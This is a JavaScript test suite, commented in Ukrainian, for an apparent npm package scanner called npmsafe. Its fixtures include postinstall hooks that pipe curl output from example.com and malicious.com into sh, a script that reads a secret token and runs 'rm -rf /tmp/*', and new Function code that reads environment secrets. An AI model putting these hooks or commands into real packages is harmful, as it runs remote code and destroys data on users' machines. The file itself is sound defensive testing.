const assert = require('assert');
const fs = require('fs');
const path = require('path');
const { analyzePackage, calculateRisk, analyzePackageScripts } = require('../src/analyzer');

// Test helper to create temporary test files
function createTestPackage(packageJson, files = {}) {
  const testDir = path.join(__dirname, 'temp_test_package');
  
  // Clean up if exists
  if (fs.existsSync(testDir)) {
    fs.rmSync(testDir, { recursive: true, force: true });
  }
  
  fs.mkdirSync(testDir, { recursive: true });
  
  // Create package.json
  fs.writeFileSync(
    path.join(testDir, 'package.json'),
    JSON.stringify(packageJson, null, 2)
  );
  
  // Create additional files
  for (const [filename, content] of Object.entries(files)) {
    fs.writeFileSync(path.join(testDir, filename), content);
  }
  
  return testDir;
}

function cleanup(testDir) {
  if (fs.existsSync(testDir)) {
    fs.rmSync(testDir, { recursive: true, force: true });
  }
}

async function runTests() {
  console.log('🧪 Запуск тестів npmsafe...\n');
  
  // Test 1: Safe package
  console.log('Test 1: Безпечний пакет');
  const safePackage = createTestPackage({
    name: 'safe-package',
    version: '1.0.0',
    scripts: {
      start: 'node index.js',
      test: 'jest'
    }
  }, {
    'index.js': 'console.log("Hello world");'
  });
  
  try {
    const result = await analyzePackage(safePackage);
    assert.strictEqual(result.risk, 'safe', 'Безпечний пакет має бути safe');
    console.log('✅ Пройдено\n');
  } catch (error) {
    console.log('❌ Провалено:', error.message, '\n');
  } finally {
    cleanup(safePackage);
  }
  
  // Test 2: Suspicious package with lifecycle scripts
  console.log('Test 2: Підозрілий пакет з lifecycle скриптами');
  const suspiciousPackage = createTestPackage({
    name: 'suspicious-package',
    version: '1.0.0',
    scripts: {
      postinstall: 'curl -s http://example.com/script.sh | sh',
      start: 'node index.js'
    }
  });
  
  try {
    const result = await analyzePackage(suspiciousPackage);
    assert.ok(['suspicious', 'malicious'].includes(result.risk), 'Підозрілий пакет має бути suspicious або malicious');
    assert.ok(result.issues.length > 0, 'Має бути хоча б одна проблема');
    console.log('✅ Пройдено\n');
  } catch (error) {
    console.log('❌ Провалено:', error.message, '\n');
  } finally {
    cleanup(suspiciousPackage);
  }
  
  // Test 2b: Lifecycle script without dangerous patterns
  console.log('Test 2b: Lifecycle script without dangerous patterns');
  const lowLifecyclePackage = createTestPackage({
    name: 'low-lifecycle-package',
    version: '1.0.0',
    scripts: {
      postinstall: 'echo "hello"',
      start: 'node index.js'
    }
  });
  
  try {
    const result = await analyzePackage(lowLifecyclePackage);
    assert.strictEqual(result.risk, 'low', 'Базовий lifecycle скрипт має бути low');
    assert.ok(result.issues.length > 0, 'Має бути хоча б одна проблема');
    console.log('✅ Пройдено\n');
  } catch (error) {
    console.log('❌ Провалено:', error.message, '\n');
  } finally {
    cleanup(lowLifecyclePackage);
  }
  
// Test 3: Malicious package with eval
  console.log('Test 3: Зловмисний пакет з eval');
  const maliciousPackage = createTestPackage({
    name: 'malicious-package',
    version: '1.0.0',
    scripts: {
      postinstall: 'node malicious.js'
    }
  }, {
    'malicious.js': `
      const { exec } = require('child_process');
      eval('process.env.SECRET_TOKEN');
      exec('rm -rf /tmp/*');
    `
  });
  
  try {
    const result = await analyzePackage(maliciousPackage);
    assert.ok(['suspicious', 'malicious'].includes(result.risk), 'Зловмисний пакет має бути suspicious або malicious');
    assert.ok(result.issues.some(issue => issue.type === 'ast'), 'Має бути хоча б одна AST проблема');
    console.log('✅ Пройдено\n');
  } catch (error) {
    console.log('❌ Провалено:', error.message, '\n');
  } finally {
    cleanup(maliciousPackage);
  }
  
  // Test 4: Risk calculation
  console.log('Test 4: Розрахунок рівня ризику');
  try {
    assert.strictEqual(calculateRisk([]), 'safe', 'Без проблем = safe');
    assert.strictEqual(calculateRisk([{ severity: 'low' }]), 'low', 'Одна low проблема = low');
    assert.strictEqual(calculateRisk([{ severity: 'medium' }]), 'suspicious', 'Medium проблема = suspicious');
    assert.strictEqual(calculateRisk([{ severity: 'low' }, { severity: 'low' }, { severity: 'low' }]), 'suspicious', 'Багато low = suspicious');
    assert.strictEqual(calculateRisk([{ severity: 'high' }, { severity: 'high' }]), 'malicious', '2+ high = malicious');
    console.log('✅ Пройдено\n');
  } catch (error) {
    console.log('❌ Провалено:', error.message, '\n');
  }
  
  // Test 5: Package scripts analysis
  console.log('Test 5: Аналіз package.json скриптів');
  try {
    const scripts = analyzePackageScripts({
      scripts: {
        postinstall: 'curl http://malicious.com | sh',
        test: 'jest'
      }
    });
    assert.ok(scripts.length > 0, 'Має виявити підозрілий postinstall скрипт');
    assert.ok(scripts[0].type === 'script', 'Тип проблеми має бути script');
    console.log('✅ Пройдено\n');
  } catch (error) {
    console.log('❌ Провалено:', error.message, '\n');
  }
  
  // Test 6: Виявлення new Function
  console.log('Test 6: Виявлення new Function');
  const newFunctionPackage = createTestPackage(
    {
      name: 'new-function-package',
      version: '1.0.0'
    },
    {
      'index.js': `const dangerous = new Function("return process.env.SECRET;");
dangerous();`
    }
  );
  
  try {
    const result = await analyzePackage(newFunctionPackage);
    assert.ok(
      result.issues.some(issue => issue.description.includes('new Function')),
      'Має виявити використання new Function()'
    );
    console.log('✅ Пройдено\n');
  } catch (error) {
    console.log('❌ Провалено:', error.message, '\n');
  } finally {
    cleanup(newFunctionPackage);
  }
  
  // Test 7: Виявлення require("child_process")
  console.log('Test 7: Виявлення require("child_process")');
  const childProcessPackage = createTestPackage(
    { name: 'child-process-package', version: '1.0.0' },
    {
      'index.js': `const cp = require('child_process');
cp.exec('ls');`
    }
  );
  
  try {
    const result = await analyzePackage(childProcessPackage);
    assert.ok(
      result.issues.some(issue => issue.description.includes('Виконання системних команд')),
      'Має виявити виклик exec() через alias'
    );
    assert.ok(
      result.issues.some(issue => issue.description.includes('child_process')),
      'Має виявити імпорт child_process'
    );
    console.log('✅ Пройдено\n');
  } catch (error) {
    console.log('❌ Провалено:', error.message, '\n');
  } finally {
    cleanup(childProcessPackage);
  }
  
// Test 8: Виявлення деструктуризації child_process
  console.log('Test 8: Виявлення деструктуризації child_process');
  const destructuredPackage = createTestPackage(
    { name: 'destructured-child-process', version: '1.0.0' },
    {
      'index.js': `const { execSync: run } = require('child_process');
run('ls');`
    }
  );
  
  try {
    const result = await analyzePackage(destructuredPackage);
    assert.ok(
      result.issues.some(issue => issue.description.includes('Деструктуризація') || issue.description.includes('child_process модуля через require')),
      'Має виявити імпорт через деструктуризацію'
    );
    assert.ok(
      result.issues.some(issue => issue.description.includes('Виконання системних команд') && issue.location.includes('index.js')),
      'Має виявити виклик execSync() через alias run'
    );
    console.log('✅ Пройдено\n');
  } catch (error) {
    console.log('❌ Провалено:', error.message, '\n');
  } finally {
    cleanup(destructuredPackage);
  }
  
  console.log('🎉 Всі тести завершено!');
}

// Запуск тестів
if (require.main === module) {
  runTests().catch(error => {
    console.error('Помилка тестування:', error);
    process.exit(1);
  });
}

module.exports = { runTests };
